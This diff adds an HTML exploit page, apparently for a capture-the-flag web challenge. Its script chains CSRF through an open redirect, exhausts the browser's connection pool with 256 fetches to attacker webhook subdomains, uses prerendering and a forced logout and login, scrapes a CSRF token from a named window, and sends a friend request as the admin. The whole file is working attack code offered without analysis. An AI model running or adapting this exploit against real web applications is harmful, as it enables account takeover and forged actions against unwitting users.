@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title></title>
+</head>
+<body>
+
+<script>
+const REMOTE = {{ REMOTE | tojson }};
+const LOCAL = {{ LOCAL | tojson }};
+const WEBHOOK = {{ WEBHOOK | tojson }};
+const u = {{ u | tojson }};
+
+const sleep = d => new Promise(r => setTimeout(r, d));
+
+const doCsrf = async (method, url, data={}, name="") => {
+	let f = document.createElement("form");
+	f.action = url;
+	f.method = method;
+	let id = name || Math.random().toString();
+	f.target = id;
+	for (let k of Object.getOwnPropertyNames(data)) {
+		let inp = document.createElement("input");
+		inp.name = k;
+		inp.value = data[k];
+		f.append(inp);
+	}
+	document.body.append(f);
+	f.submit();
+	f.remove();
+
+	if (!name) {
+		for (let i = 0; i < 5; i++) {
+			window.addConn();
+			await sleep(500);
+			window.releaseConn();
+			await sleep(500);
+		}
+		await sleep(1000);
+		open("", id).close();
+		return;
+	}
+}
+
+const getCsrf = text => text.match(/name="csrf_token" value="(.*?)"/)[1]
+
+window.controllers = [];
+window.releaseConn = () => {
+	console.assert(window.controllers.length > 0);
+	window.controllers.shift().abort();
+}
+
+window.cnt = 0;
+window.addConn = () => {
+	let hex = cnt.toString(16).padStart(3, "0");
+	const controller = new AbortController();
+	const signal = controller.signal;
+	fetch(`http://${hex}.${WEBHOOK}:8080/zzz?${hex}`, { signal, priority: "high" });
+	window.controllers.push(controller);
+	window.cnt++;
+}
+
+const main = async () => {
+	await sleep(1000);
+
+	// prepare the csrf flash
+	await doCsrf("POST", `/redir?url=${REMOTE}/notes/create`, { content: "asdasdssad" }, "closeme");
+	await sleep(5000); // wait for all the redirects
+	open("", "closeme").close();
+
+	await sleep(1000);
+
+	for (let i = 0; i < 256; i++) {
+		addConn();
+		await sleep(10);
+	}
+
+	await sleep(1000);
+
+	// prepare the prerender
+	let pr = document.createElement("link");
+	pr.rel = "prerender";
+	pr.href = `${REMOTE}/notes/?${Math.random()}`;
+	document.body.appendChild(pr);
+
+	await sleep(1000);
+
+	// window.releaseConn();
+
+	// return;
+
+	await doCsrf("GET", `${REMOTE}/logout`);
+	await doCsrf("POST", `${REMOTE}/login`, { username: u, password: u }, "closeme");
+	for (let i = 0; i < 5; i++) {
+		window.addConn();
+		await sleep(500);
+		window.releaseConn();
+		await sleep(500);
+	}
+	await sleep(1000);
+	console.log("got here");
+	let csrf_token = getCsrf(open("", "closeme")[0][0].name);
+	console.log("can we get the csrf token please");
+	open("", "closeme").close();
+
+	await sleep(1000);
+
+	console.log(csrf_token);
+
+	console.log("logging back in");
+
+	for (let i = 0; i < 5; i++) {
+		await sleep(500);
+		window.releaseConn();
+	}
+
+	await sleep(1000);
+
+	// we're logged back in as the admin now. send ourselves a friend request
+
+	await doCsrf("POST", `${REMOTE}/friends/request`, { username: u, csrf_token }, "closeme");
+}
+
+main()
+
+</script>
+
+<button onclick=main()>go</button>
+
+</body>
+</html>
